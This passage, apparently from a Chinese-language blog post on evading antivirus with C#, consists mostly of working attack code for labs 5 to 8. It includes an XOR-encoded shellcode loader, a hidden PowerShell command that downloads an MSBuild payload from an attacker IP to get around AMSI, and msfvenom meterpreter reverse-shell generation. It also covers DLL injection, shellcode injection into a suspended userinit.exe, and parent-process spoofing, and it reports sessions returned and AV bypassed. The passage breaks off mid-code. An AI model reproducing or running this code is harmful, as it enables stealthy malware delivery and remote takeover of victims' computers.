-    byte[] xorshellcode = new byte[666] { 0x9a, 0x92, 0x9a, 0x30, 0x61, 0xb5, 0xf8, 0x5c, 0x6f, 0x21, 0x69, 0x1f, 0x72, 0x8d, 0xf4, 0xe1, 0x73, 0x16, 0x5e, 0x46, 0x14, 0x58, 0xc0, 0x81, 0x41, 0xa3, 0xa8, 0xd0, 0x87, 0x86, 0x0d, 0x06, 0x91, 0xba, 0xf0, 0xb1, 0x83, 0x49, 0x5a, 0x97, 0x81, 0x00, 0x79, 0x51, 0xd5, 0xf7, 0x7b, 0x56, 0x40, 0x71, 0x18, 0x34, 0xd1, 0x2b, 0x57, 0xf8, 0x25, 0xfb, 0xeb, 0x2a, 0xe8, 0x6b, 0x83, 0xe9, 0xb6, 0xbc, 0xd8, 0x79, 0x2b, 0xbb, 0x7a, 0x42, 0x00, 0x8b, 0x11, 0x15, 0xfe, 0xd1, 0xd4, 0xa9, 0x30, 0x38, 0xbe, 0x89, 0xe0, 0x67, 0x83, 0x62, 0xeb, 0xe0, 0xea, 0x0a, 0xaa, 0xeb, 0xfa, 0x6c, 0x59, 0x9c, 0xe1, 0x14, 0xd0, 0x7f, 0xa1, 0x1d, 0x6b, 0x9e, 0x6f, 0xcb, 0x99, 0x95, 0xa2, 0xb8, 0x36, 0x88, 0x79, 0x64, 0x6d, 0xe2, 0x47, 0x62, 0x4b, 0x86, 0xa2, 0xf9, 0xba, 0x82, 0xe3, 0x44, 0xdf, 0x94, 0x91, 0x6f, 0xab, 0x4e, 0x7b, 0xd6, 0x37, 0xb1, 0xb1, 0x39, 0x98, 0x3c, 0xd7, 0x3d, 0x2a, 0x5e, 0x26, 0x12, 0xcd, 0xd0, 0x8d, 0xfb, 0xbe, 0x25, 0xff, 0xfe, 0xba, 0xa3, 0x5b, 0xfc, 0x57, 0xf0, 0xb9, 0x8d, 0xd1, 0xaf, 0x41, 0x83, 0x06, 0x01, 0x1c, 0xe2, 0x47, 0xa1, 0x94, 0xc6, 0xd2, 0x18, 0x5f, 0xcd, 0xfe, 0x40, 0xb9, 0x49, 0xe5, 0x48, 0x2c, 0xd9, 0x4c, 0x1c, 0xf8, 0xda, 0xc2, 0xa8, 0xd0, 0xf0, 0xa4, 0x68, 0x11, 0xeb, 0x74, 0x84, 0x11, 0x84, 0x60, 0xd7, 0xc8, 0x10, 0xde, 0xd5, 0xe1, 0x00, 0x98, 0x4a, 0x05, 0xbf, 0xac, 0xf0, 0xea, 0x00, 0x69, 0xe6, 0x35, 0xb6, 0x12, 0x4f, 0xa0, 0x07, 0xb1, 0x7f, 0x9f, 0x08, 0x03, 0xb3, 0x78, 0x88, 0xa7, 0x37, 0x7a, 0x09, 0xb2, 0x06, 0x15, 0x3b, 0x83, 0xf2, 0x71, 0x0c, 0x8b, 0xaf, 0xf8, 0x3e, 0xd8, 0xa9, 0xf2, 0x79, 0x66, 0x0d, 0x89, 0x69, 0x65, 0x79, 0x49, 0x23, 0x3b, 0xbe, 0x03, 0x78, 0x63, 0x4f, 0x65, 0x4d, 0xb8, 0xbf, 0xd3, 0xf1, 0xcc, 0x63, 0x67, 0xa1, 0x1a, 0xf5, 0xc0, 0x3b, 0xd8, 0x94, 0xe8, 0xc3, 0xf6, 0x6c, 0x49, 0x3e, 0x53, 0xa1, 0x2f, 0xfe, 0x1b, 0x33, 0xc2, 0xb2, 0x90, 0x3b, 0xee, 0x2e, 0x6e, 0x04, 0x78, 0xf7, 0x35, 0x0d, 0x88, 0x78, 0x82, 0x34, 0x24, 0x64, 0x53, 0x99, 0xd1, 0xa5, 0x6b, 0xac, 0x25, 0xc5, 0x5d, 0x8c, 0x02, 0xbb, 0x8a, 0x81, 0x15, 0xcb, 0x41, 0x39, 0x22, 0x53, 0xbf, 0xaf, 0xca, 0x93, 0xc5, 0x11, 0xa0, 0xc5, 0x97, 0x07, 0x64, 0x3d, 0x75, 0xb5, 0x6d, 0x18, 0x3a, 0x14, 0xeb, 0xbb, 0x83, 0xd8, 0x1c, 0xf9, 0x87, 0xa7, 0xb4, 0x5c, 0x81, 0xba, 0x1e, 0xcc, 0xa0, 0xd1, 0x61, 0x09, 0x12, 0x02, 0x2b, 0x02, 0xbf, 0x18, 0x93, 0x4d, 0xf1, 0x70, 0x0a, 0xf6, 0x5e, 0x72, 0x75, 0x6e, 0xa1, 0xc3, 0x69, 0xa7, 0xb9, 0xe4, 0xe0, 0x09, 0xf1, 0x43, 0xfb, 0xe3, 0xae, 0xd3, 0x01, 0xd1, 0xc1, 0x45, 0xdb, 0x09, 0xf9, 0xce, 0x83, 0x35, 0xc2, 0xb5, 0x51, 0xd4, 0x9c, 0x3e, 0xe1, 0x8d, 0xa6, 0x36, 0x39, 0x01, 0x6a, 0xe3, 0x8a, 0x2c, 0xa1, 0x7e, 0x4e, 0x49, 0xfe, 0xe2, 0xb6, 0x4e, 0x30, 0x16, 0xc7, 0x61, 0x67, 0xc9, 0x5d, 0x9d, 0x7b, 0xa7, 0x1b, 0x38, 0xcb, 0xcc, 0x88, 0x4a, 0x46, 0x84, 0x5b, 0x84, 0x31, 0xf7, 0x30, 0x09, 0x51, 0x1c, 0xd4, 0x91, 0xcb, 0x74, 0xec, 0x0a, 0xd9, 0x39, 0xca, 0xeb, 0x03, 0xf2, 0x46, 0xf3, 0x1c, 0xb1, 0x93, 0x6a, 0x02, 0x3b, 0xca, 0x9a, 0x69, 0x19, 0x68, 0x89, 0x26, 0xdb, 0x8f, 0xf3, 0x74, 0x12, 0xb2, 0x96, 0x2c, 0x85, 0xd9, 0x93, 0xcb, 0x15, 0x7b, 0x10, 0x9f, 0x07, 0xa2, 0xfc, 0xf9, 0x5f, 0xe1, 0x8b, 0x29, 0x2d, 0x51, 0x8e, 0xad, 0x36, 0xb6, 0xf9, 0xb9, 0xe4, 0x9b, 0x15, 0x3c, 0x5e, 0xf4, 0xf1, 0x0e, 0x07, 0xfd, 0x9e, 0x89, 0xe1, 0xab, 0xd1, 0x6a, 0xac, 0x66, 0xbf, 0x18, 0x74, 0x9d, 0x3a, 0x0c, 0xdf, 0x43, 0x4a, 0xd8, 0x46, 0x2e, 0xe7, 0x5c, 0x3f, 0xcf, 0x38, 0x52, 0x86, 0x09, 0xa0, 0x25, 0x8f, 0xa9, 0x9b, 0x9f, 0x53, 0x87, 0xcb, 0x28, 0xa1, 0x9a, 0x27, 0x19, 0x4a, 0x82, 0x66, 0xa3, 0x4a, 0x17, 0x4a, 0xe0, 0x8e, 0xa2, 0xd8, 0xab, 0xb8, 0x2b, 0x98, 0xed, 0xeb, 0xee, 0x5d, 0x1d, 0x18, 0x59, 0xf6, 0x25, 0x41, 0x8f, 0x03, 0x66, 0x77, 0xd2, 0x59, 0xe6, 0x82, 0x93, 0x82, 0xec, 0xe2, 0xd2, 0x82, 0x5f, 0x89, 0x3c, 0x72, 0x5e, 0x26, 0xfe, 0x0e, 0xbb, 0x96, 0xa8, 0xc8, 0x72, 0x21, 0x17, 0x2f, 0x5f, 0x2a, 0x88, 0x27, 0xa3, 0xfa, 0x26, 0x69, 0x35, 0x2b, 0x5c, 0x43, 0x00, 0x79, 0xf2, 0x86, 0x66, 0xfc, 0x34, 0x72, 0x83, 0xea, 0xa7, 0xaf, 0xc4, 0xe5, 0x3c, 0x73, 0x91, 0x7b, 0xe4, 0x88, 0xfb, 0xed, 0xe4, 0x5f, 0xae, 0x24 };
-    byte [] shellcode;
-    shellcode = xor(xorshellcode, Encoding.ASCII.GetBytes(key));
-
-    UInt32 codeAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    Marshal.Copy(shellcode, 0, (IntPtr)(codeAddr), shellcode.Length);
-    IntPtr threadHandle = IntPtr.Zero;
-    UInt32 threadId = 0;
-    IntPtr parameter = IntPtr.Zero;
-    threadHandle = CreateThread(0, 0, codeAddr, parameter, 0, ref threadId);
-    WaitForSingleObject(threadHandle, 0xFFFFFFFF);
-    return;
-}
-}</code></pre><h2 id="lab5"><a href="#lab5" class="headerlink" title="lab5"></a>lab5</h2><blockquote>
-<p>最后结果：全过</p>
-</blockquote>
-<ul>
-<li>lab5主要是用于利用.NET框架绕过禁用cmd和powershell的环境来执行命令。        </li>
-<li>这里就只是相当于将ps1脚本打包成可执行文件，并且不通过powershell.exe执行。</li>
-<li>这里的情况是尽管程序免杀但是但是没办法过AMSI检测，但是如果过不了AMSI检测就没办法执行。</li>
-<li>免杀需要将powershell命令通过AMSI检测，索性我就直接用MSBuild白名单来绕过。</li>
-</ul>
-<pre><code>using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Management.Automation;
-using System.Collections.ObjectModel;
-
-public class Program
-{
-public static void Main()
-{
-
-    PowerShell ps1 = PowerShell.Create();
-    ps1.AddScript(&quot;powershell -w hidden Invoke-WebRequest -uri http://172.22.35.212/8080.xml -OutFile 8080.xml;C:/Windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 8080.xml&quot;);
-    ps1.Invoke();
-
-
-    PowerShell ps2 = PowerShell.Create();
-    ps2.AddCommand(&quot;Get-Process&quot;);
-    Collection&lt;PSObject&gt; PSOutput = ps2.Invoke();
-    foreach (PSObject outputItem in PSOutput)
-    {
-        if (outputItem != null)
-        {
-            Console.WriteLine(outputItem);
-        }
-    }
-
-
-}
-}</code></pre><p>正常返回session<br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/03.png" alt="avatar"></p>
-<h2 id="lab6"><a href="#lab6" class="headerlink" title="lab6"></a>lab6</h2><blockquote>
-<p>测试结果：过360和电脑管家<br>lab6主要是dll注入，目前来说360和电脑管家对dll的查杀好像没那么强。<br>lab6的重点是将dll注入到一个已存在的进程中，使其逃避安全人员的检测。</p>
-</blockquote>
-<p>0x01</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080  -f dll -o  ShellcodeDll.dll   //生成shellcode
-handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_https    //监听</code></pre><p>0x02   </p>
-<pre><code>using System.Runtime.InteropServices;
-using System.Text;
-
-
-public class Program
-{
-
-[DllImport(&quot;kernel32.dll&quot;)]
-public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
-
-[DllImport(&quot;kernel32.dll&quot;, SetLastError = true, ExactSpelling = true)]
-static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,uint dwSize, uint flAllocationType, uint flProtect);
-
-[DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
-
-[DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto)]
-public static extern IntPtr GetModuleHandle(string lpModuleName);
-
-[DllImport(&quot;kernel32&quot;, CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
-static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-[DllImport(&quot;kernel32.dll&quot;)]
-static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
-
-
-const int PROCESS_CREATE_THREAD = 0x0002;
-const int PROCESS_QUERY_INFORMATION = 0x0400;
-const int PROCESS_VM_OPERATION = 0x0008;
-const int PROCESS_VM_WRITE = 0x0020;
-const int PROCESS_VM_READ = 0x0010;
-
-
-const uint MEM_COMMIT = 0x00001000;
-const uint MEM_RESERVE = 0x00002000;
-const uint PAGE_READWRITE = 4;
-
-
-public static void Main()
-{
-    Console.WriteLine(&quot;Listing all processes...&quot;);
-    Console.WriteLine(&quot;--------------------------------------------------------------------&quot;);
-
-    Process[] procs = Process.GetProcesses();
-    foreach (Process proc in procs)
-    {
-        try{
-            Console.WriteLine(&quot;Name:&quot; + proc.ProcessName +&quot; Path:&quot; + proc.MainModule.FileName + &quot; Id:&quot;+ proc.Id);
-        }
-        catch{
-            continue;
-        }    
-    }
-    Console.WriteLine(&quot;--------------------------------------------------------------------\n&quot;);
-    Console.WriteLine(&quot;Enter Process Id to inspect:&quot;);
-    int val ;
-    val =  Convert.ToInt32(Console.ReadLine());
-    Console.WriteLine(val);
-    Process proc1 = Process.GetProcessById(val);
-
-    Console.WriteLine(&quot;Getting handle to process &quot;+proc1.MainModule.FileName);
-    IntPtr procHandle = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, false, proc1.Id);
-    Console.WriteLine(&quot;Got handle &quot; + procHandle);
-
-    string dllPath = &quot;C:\\Users\\user\\Development\\defcon207\\lab6\\ShellcodeInjectionDll\\ShellcodeDll.dll&quot;;
-
-    Console.WriteLine(&quot;Allocating memory in &quot;+proc1.MainModule.FileName);
-    IntPtr memAddr = VirtualAllocEx(procHandle, IntPtr.Zero, (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    Console.WriteLine(&quot;Done.&quot;);
-
-    Console.WriteLine(&quot;Writing to process memory&quot;);
-    UIntPtr bytesWritten;
-    bool resp1 = WriteProcessMemory(procHandle, memAddr, Encoding.Default.GetBytes(dllPath), (uint)((dllPath.Length + 1) * Marshal.SizeOf(typeof(char))), out bytesWritten);
-    Console.WriteLine(&quot;Done.&quot;);
-
-    Console.WriteLine(&quot;Calculating the address of LoadLibraryA...&quot;);
-    IntPtr loadLibraryAddr = GetProcAddress(GetModuleHandle(&quot;kernel32.dll&quot;), &quot;LoadLibraryA&quot;);
-    Console.WriteLine(&quot;Done.&quot;);
-
-    Console.WriteLine(&quot;Calling CreateRemoteThread&quot;);
-    CreateRemoteThread(procHandle, IntPtr.Zero, 0, loadLibraryAddr, memAddr, 0, IntPtr.Zero);
-
-
-
-
-
-}
-}</code></pre><h2 id="lab7"><a href="#lab7" class="headerlink" title="lab7"></a>lab7</h2><blockquote>
-<p>测试结果：过360及电脑管家。<br>lab7主要用于启动一个进程，然后向该进程注入shellcode。<br>在Process Explorer中可以看到我们的的恶意代码是由一个正常的进程运行的。</p>
-</blockquote>
-<p> PS：不会产生新的进程，也没有落地的文件,意味着安全人员的检测将会更加困难。</p>
-<p> 0x01</p>
-<pre><code>msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.22.35.212 LPORT=8080 -f csharp
-handler -H 172.22.35.212 -P 8080 -p windows/x64/meterpreter/reverse_tcp</code></pre><p> 0x02</p>
-<pre><code>using System.Diagnostics;
-using System.Runtime.InteropServices;
-using System;
-using System.Text;
-public class Program
-{
-[StructLayout(LayoutKind.Sequential)]
-public class SecurityAttributes
-{
-    public Int32 Length = 0;
-    public IntPtr lpSecurityDescriptor = IntPtr.Zero;
-    public bool bInheritHandle = false;
-
-    public SecurityAttributes()
-    {
-        this.Length = Marshal.SizeOf(this);
-    }
-}
-[StructLayout(LayoutKind.Sequential)]
-public struct ProcessInformation
-{
-    public IntPtr hProcess;
-    public IntPtr hThread;
-    public Int32 dwProcessId;
-    public Int32 dwThreadId;
-}
-[Flags]
-public enum CreateProcessFlags : uint
-{
-    DEBUG_PROCESS = 0x00000001,
-    DEBUG_ONLY_THIS_PROCESS = 0x00000002,
-    CREATE_SUSPENDED = 0x00000004,
-    DETACHED_PROCESS = 0x00000008,
-    CREATE_NEW_CONSOLE = 0x00000010,
-    NORMAL_PRIORITY_CLASS = 0x00000020,
-    IDLE_PRIORITY_CLASS = 0x00000040,
-    HIGH_PRIORITY_CLASS = 0x00000080,
-    REALTIME_PRIORITY_CLASS = 0x00000100,
-    CREATE_NEW_PROCESS_GROUP = 0x00000200,
-    CREATE_UNICODE_ENVIRONMENT = 0x00000400,
-    CREATE_SEPARATE_WOW_VDM = 0x00000800,
-    CREATE_SHARED_WOW_VDM = 0x00001000,
-    CREATE_FORCEDOS = 0x00002000,
-    BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
-    ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
-    INHERIT_PARENT_AFFINITY = 0x00010000,
-    INHERIT_CALLER_PRIORITY = 0x00020000,
-    CREATE_PROTECTED_PROCESS = 0x00040000,
-    EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
-    PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
-    PROCESS_MODE_BACKGROUND_END = 0x00200000,
-    CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
-    CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
-    CREATE_DEFAULT_ERROR_MODE = 0x04000000,
-    CREATE_NO_WINDOW = 0x08000000,
-    PROFILE_USER = 0x10000000,
-    PROFILE_KERNEL = 0x20000000,
-    PROFILE_SERVER = 0x40000000,
-    CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
-}
-
-
-[StructLayout(LayoutKind.Sequential)]
-public class StartupInfo
-{
-    public Int32 cb = 0;
-    public IntPtr lpReserved = IntPtr.Zero;
-    public IntPtr lpDesktop = IntPtr.Zero;
-    public IntPtr lpTitle = IntPtr.Zero;
-    public Int32 dwX = 0;
-    public Int32 dwY = 0;
-    public Int32 dwXSize = 0;
-    public Int32 dwYSize = 0;
-    public Int32 dwXCountChars = 0;
-    public Int32 dwYCountChars = 0;
-    public Int32 dwFillAttribute = 0;
-    public Int32 dwFlags = 0;
-    public Int16 wShowWindow = 0;
-    public Int16 cbReserved2 = 0;
-    public IntPtr lpReserved2 = IntPtr.Zero;
-    public IntPtr hStdInput = IntPtr.Zero;
-    public IntPtr hStdOutput = IntPtr.Zero;
-    public IntPtr hStdError = IntPtr.Zero;
-    public StartupInfo()
-    {
-        this.cb = Marshal.SizeOf(this);
-    }
-}
-[DllImport(&quot;kernel32.dll&quot;)]
-public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,
-        IntPtr lpEnvironment,
-        String lpCurrentDirectory,
-        [In] StartupInfo lpStartupInfo,
-        out ProcessInformation lpProcessInformation
-
-    );
-
-[DllImport(&quot;kernel32.dll&quot;)]
-public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);
-
-[DllImport(&quot;kernel32.dll&quot;)]
-public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);
-
-[DllImport(&quot;kernel32.dll&quot;)]
-static extern IntPtr CreateRemoteThread(IntPtr hProcess,IntPtr lpThreadAttributes,uint dwStackSize,IntPtr lpStartAddress,IntPtr lpParameter,uint dwCreationFlags,IntPtr lpThreadId);
-
-
-private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
-private static UInt32 MEM_COMMIT = 0x1000;
-
-public static void Main()
-{
-    string binary = &quot;userinit.exe&quot;;
-
-    byte[] sc = new byte[679] {
-0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
-0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
-0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
-0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
-0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
-0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
-0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
-0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,
-0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,
-0x5a,0x59,0x6e,0x42,0x4a,0x64,0x36,0x62,0x67,0x52,0x63,0x69,0x33,0x67,0x55,
-0x36,0x30,0x47,0x53,0x76,0x57,0x6e,0x72,0x79,0x63,0x2d,0x46,0x7a,0x31,0x53,
-0x2d,0x4a,0x31,0x6c,0x76,0x55,0x77,0x2d,0x46,0x47,0x4a,0x62,0x47,0x75,0x57,
-0x30,0x46,0x61,0x50,0x4c,0x49,0x4b,0x63,0x4a,0x35,0x52,0x7a,0x43,0x37,0x43,
-0x5a,0x31,0x77,0x62,0x58,0x6f,0x41,0x2d,0x47,0x73,0x35,0x65,0x56,0x32,0x79,
-0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,
-0x32,0xa0,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,
-0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,
-0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49, 
-0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,
-0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,
-0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,
-0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,
-0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,
-0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,
-0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,
-0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,
-0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,
-0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,
-0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,
-0xa2,0x56,0xff,0xd5 };
-
-    Int32 size = sc.Length;
-    StartupInfo sInfo = new StartupInfo();
-    sInfo.dwFlags = 0;
-    ProcessInformation pInfo;
-    string binaryPath = &quot;C:\\Windows\\System32\\&quot;+binary;    
-    IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
-    IntPtr hProcess = pInfo.hProcess;
-    IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-    int test = 0;
-    IntPtr size2 = new IntPtr(sc.Length);
-    bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, test);
-    CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
- }
-}</code></pre><p>0x03</p>
-<p> 一个正常进程，返回了session。<br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/04.png" alt="avatar"><br> <img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/10/05/%E5%88%A9%E7%94%A8C%23byass%20AV/05.png" alt="avatar"></p>
-<h2 id="lab8"><a href="#lab8" class="headerlink" title="lab8"></a>lab8</h2><blockquote>
-<p>测试结果：全过。</p>
-</blockquote>
-<ul>
-<li>lab8可以向一个已存在进程插入一个新的进程，并向这个新的进程其注入shellcode以获得反向shell。</li>
-<li>这里选择插入cmd命令，MSBuil白加黑获取shell</li>
-</ul>
-<p>PS：主要由于笔者太菜，没能成功插入shellcode</p>
-<p>0x01</p>
-<pre><code>using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Runtime.InteropServices;
-using Microsoft.Win32.SafeHandles;
-using System.IO;
-using System.Diagnostics;
-
-namespace ExecutionTesting
-{
-class Program
-{
-    static void Main(string[] args)
-    {
-    Console.WriteLine(&quot;Listing all processes...&quot;);
-    Console.WriteLine(&quot;-------------------------------------------`-------------------------&quot;);
-
-    Process[] procs = Process.GetProcesses();
-    foreach (Process proc in procs)
-    {
-        try
-        {
-            Console.WriteLine(&quot;Name:&quot; + proc.ProcessName + &quot; Path:&quot; + proc.MainModule.FileName + &quot; Id:&quot; + proc.Id);
-        }
-        catch
-        {
-            continue;
-        }
-    }
-        if (args.Length != 1)
-        {
-            Console.WriteLine(&quot;Usage: ExecutionTesting.exe &lt;pid&gt;&quot;);
-            return;
-        }
-
-        int newParentProcId;
-        if (!Int32.TryParse(args[0], out newParentProcId))
-        {
-            Console.WriteLine(&quot;Usage: ExecutionTesting.exe &lt;pid&gt;&quot;);
-            return;
-        }
-
-        // Modify the below to execute something else, ping -n 15 used so we can watch in procexp ;)
-        string command = &quot;cmd.exe /c powershell -w hidden Invoke-WebRequest -uri http://172.22.35.212/8080.xml -OutFile 8080.xml;C:/Windows/Microsoft.NET/Framework/v4.0.30319/MSBuild.exe 8080.xml&quot;;
-
-        Console.WriteLine(String.Format(&quot;Press enter to execute &apos;{0}&apos; under pid {1}&quot;, command, newParentProcId));
-        Console.ReadKey();
-        UnmanagedExecute.CreateProcess(newParentProcId, command);
-        Console.WriteLine(&quot;Done. Press any key to exit...&quot;);
-        Console.ReadKey();
-    }
-}
-
-class UnmanagedExecute
-{
-    [DllImport(&quot;kernel32.dll&quot;)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    static extern bool CreateProcess(
-        string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
-        ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
-        IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
-        out PROCESS_INFORMATION lpProcessInformation);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool UpdateProcThreadAttribute(
-        IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
-        IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool InitializeProcThreadAttributeList(
-        IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask,
-       HANDLE_FLAGS dwFlags);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    static extern bool PeekNamedPipe(IntPtr handle,
-        IntPtr buffer, IntPtr nBufferSize, IntPtr bytesRead,
-        ref uint bytesAvail, IntPtr BytesLeftThisMessage);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    static extern bool CloseHandle(IntPtr hObject);
-
-    [DllImport(&quot;kernel32.dll&quot;, SetLastError = true)]
-    [return: MarshalAs(UnmanagedType.Bool)]
-    static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
-       IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle,
-       uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);
-
-    [DllImport(&quot;kernel32.dll&quot;, CharSet = CharSet.Auto, SetLastError = true)]
-    public static extern int GetConsoleOutputCP();
-
-    [DllImport(&quot;kernel32.dll&quot;)]
-    static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
-       ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);
-
-    public static bool CreateProcess(int parentProcessId, string command)
-    {
-        // STARTUPINFOEX members
-        const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
-
-        // STARTUPINFO members (dwFlags and wShowWindow)
-        const int STARTF_USESTDHANDLES = 0x00000100;
-        const int STARTF_USESHOWWINDOW = 0x00000001;
-        const short SW_HIDE = 0x0000;
-
